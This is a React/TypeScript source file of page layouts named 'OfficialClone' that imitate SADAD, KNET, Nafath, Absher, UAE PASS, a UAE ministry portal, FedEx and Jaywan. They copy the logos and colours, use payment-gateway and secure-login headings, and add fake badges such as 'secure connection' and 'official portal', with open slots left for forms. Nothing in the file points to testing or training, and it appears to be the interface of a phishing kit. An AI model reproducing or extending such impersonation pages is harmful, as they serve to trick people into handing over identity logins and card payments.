import React from 'react';
import { Shield, Lock, Globe, CreditCard, ChevronLeft, CheckCircle2, Menu, Info } from 'lucide-react';

interface CloneProps {
  children: React.ReactNode;
  amount?: string;
  serviceName?: string;
  trackingNumber?: string;
}

export const SADADOfficialClone: React.FC<CloneProps> = ({ children, amount, serviceName }) => (
  <div className="min-h-screen bg-[#F7F7F7] font-sans" dir="rtl">
    <nav className="bg-white border-b-4 border-[#EB7625] px-6 py-4 flex items-center justify-between shadow-md">
      <div className="flex items-center gap-6">
        <img src="/assets/branding/logo-sadad.png" alt="SADAD" className="h-14" />
        <div className="hidden md:block">
          <h1 className="text-xl font-bold text-[#333]">نظام سداد للمدفوعات</h1>
          <p className="text-xs text-gray-500">SADAD Payment System</p>
        </div>
      </div>
      <div className="flex items-center gap-4">
        <div className="flex items-center gap-2 text-green-600 font-bold text-sm bg-green-50 px-3 py-1 rounded-full border border-green-100">
          <Lock className="w-4 h-4" />
          <span>اتصال آمن</span>
        </div>
      </div>
    </nav>
    <main className="container mx-auto px-4 py-10 max-w-4xl">
      <div className="bg-white rounded-none shadow-2xl overflow-hidden border border-gray-100">
        <div className="bg-[#EB7625] p-8 text-white flex items-center justify-between">
          <div><h2 className="text-2xl font-black mb-1">تفاصيل الفاتورة</h2></div>
          {amount && <div className="text-3xl font-black">{amount}</div>}
        </div>
        <div className="p-10">{children}</div>
      </div>
    </main>
  </div>
);

export const KNETOfficialClone: React.FC<CloneProps> = ({ children, amount }) => (
  <div className="min-h-screen bg-[#F0F2F5] font-sans" dir="rtl">
    <header className="bg-white px-6 py-6 flex flex-col items-center justify-center border-b shadow-sm">
      <img src="/assets/branding/logo-knet.png" alt="KNET" className="h-16 mb-4" />
      <div className="w-full h-1 bg-gradient-to-r from-green-600 via-blue-600 to-red-600 rounded-full max-w-md" />
    </header>
    <main className="container mx-auto px-4 py-8 max-w-2xl">
      <div className="bg-white rounded-none shadow-xl overflow-hidden">
        <div className="bg-[#007A33] p-6 text-white text-center">
          <h2 className="text-xl font-bold">بوابة الدفع الإلكتروني</h2>
          {amount && <div className="text-3xl font-black mt-2">{amount}</div>}
        </div>
        <div className="p-8">{children}</div>
      </div>
    </main>
  </div>
);

export const NafathOfficialClone: React.FC<CloneProps> = ({ children }) => (
  <div className="min-h-screen bg-[#F4F7F9] font-sans text-right" dir="rtl">
    <header className="bg-white border-b-2 border-[#1A3B77] px-6 h-20 flex items-center justify-between shadow-sm">
      <img src="/assets/branding/logo-nafath.png" alt="Nafath" className="h-12" />
      <img src="/assets/branding/logo-vision-2030.png" alt="Vision 2030" className="h-10 opacity-30 grayscale" />
    </header>
    <main className="container mx-auto px-4 py-12 flex justify-center">
      <div className="w-full max-w-md bg-white rounded-3xl shadow-xl border border-gray-100 overflow-hidden">
        <div className="bg-[#1A3B77] p-8 text-white text-center">
          <Shield className="w-12 h-12 mx-auto mb-4" />
          <h2 className="text-xl font-bold">تسجيل الدخول الآمن</h2>
        </div>
        <div className="p-8">{children}</div>
      </div>
    </main>
  </div>
);

export const AbsherOfficialClone: React.FC<CloneProps> = ({ children }) => (
  <div className="min-h-screen bg-[#F9FAFB] font-sans text-right" dir="rtl">
    <header className="bg-[#003D7A] px-6 h-16 flex items-center justify-between">
      <img src="/assets/branding/logo-absher.png" alt="Absher" className="h-10" />
      <div className="flex items-center gap-4 text-white text-xs font-bold">
        <span>الخدمات الإلكترونية</span>
      </div>
    </header>
    <main className="container mx-auto px-4 py-12 flex justify-center">
      <div className="w-full max-w-xl bg-white rounded-xl shadow-lg border border-gray-200 overflow-hidden">
        <div className="border-b-4 border-[#A9855A] p-6 bg-gray-50 flex items-center justify-between">
          <h2 className="text-lg font-bold text-[#003D7A]">بوابة التحقق الموحدة</h2>
          <Lock className="w-5 h-5 text-[#A9855A]" />
        </div>
        <div className="p-8">{children}</div>
      </div>
    </main>
  </div>
);

export const UaePassOfficialClone: React.FC<CloneProps> = ({ children }) => (
  <div className="min-h-screen bg-black font-sans text-right" dir="rtl">
    <header className="bg-white/5 border-b border-white/10 px-6 h-16 flex items-center justify-between">
      <img src="/assets/branding/logo-uae-gov.png" alt="UAE PASS" className="h-10 brightness-0 invert" />
      <Menu className="w-5 h-5 text-white" />
    </header>
    <main className="container mx-auto px-4 py-20 flex flex-col items-center">
      <div className="text-center mb-12">
        <h1 className="text-3xl font-bold text-white mb-2">UAE PASS</h1>
        <p className="text-gray-500">هويتك الرقمية الوطنية</p>
      </div>
      <div className="w-full max-w-md bg-white p-10 rounded-[40px] shadow-2xl">{children}</div>
    </main>
  </div>
);

export const MinistryOfficialClone: React.FC<CloneProps> = ({ children, serviceName }) => (
  <div className="min-h-screen bg-[#F8F9FA] font-sans" dir="rtl">
    <header className="bg-white border-b px-6 py-6 flex items-center justify-between">
      <div className="flex items-center gap-4">
        <img src="/assets/branding/logo-uae-gov.png" alt="Logo" className="h-14" />
        <div className="h-10 w-px bg-gray-200" />
        <h1 className="text-lg font-bold text-gray-800">{serviceName}</h1>
      </div>
      <div className="flex items-center gap-3">
        <div className="bg-green-50 text-green-700 px-3 py-1 rounded-full text-xs font-bold border border-green-100 flex items-center gap-1">
          <Shield className="w-3 h-3" /> بوابة رسمية
        </div>
      </div>
    </header>
    <main className="container mx-auto px-4 py-12 max-w-4xl">
      <div className="bg-white shadow-sm border p-10 rounded-xl">{children}</div>
    </main>
  </div>
);

export const FedExOfficialClone: React.FC<CloneProps> = ({ children, amount }) => (
  <div className="min-h-screen bg-white font-sans" dir="ltr">
    <header className="px-10 py-6 border-b-8 border-[#4D148C]">
      <img src="/assets/branding/logo-fedex.png" alt="FedEx" className="h-10" />
    </header>
    <main className="container mx-auto px-4 py-12 flex justify-center">
      <div className="w-full max-w-2xl border shadow-lg p-10">
        <h2 className="text-2xl font-bold text-[#4D148C] mb-6">Complete Your Payment</h2>
        {children}
      </div>
    </main>
  </div>
);

export const JaywanOfficialClone: React.FC<CloneProps> = ({ children, amount }) => (
  <div className="min-h-screen bg-[#F0F2F5] font-sans" dir="rtl">
    <header className="bg-white px-6 py-6 flex items-center justify-between border-b shadow-sm">
      <img src="/assets/branding/logo-jaywan.png" alt="Jaywan" className="h-12" />
      <div className="flex items-center gap-2 text-green-600 font-bold text-sm bg-green-50 px-3 py-1 rounded-full border border-green-100">
          <Lock className="w-4 h-4" />
          <span>Secure Connection</span>
      </div>
    </header>
    <main className="container mx-auto px-4 py-8 max-w-2xl">
      <div className="bg-white rounded-none shadow-xl overflow-hidden">
        <div className="bg-[#CE1126] p-6 text-white text-center">
          <h2 className="text-xl font-bold">Payment Portal | بوابة الدفع</h2>
          {amount && <div className="text-3xl font-black mt-2">{amount}</div>}
        </div>
        <div className="p-8">{children}</div>
      </div>
    </main>
  </div>
);
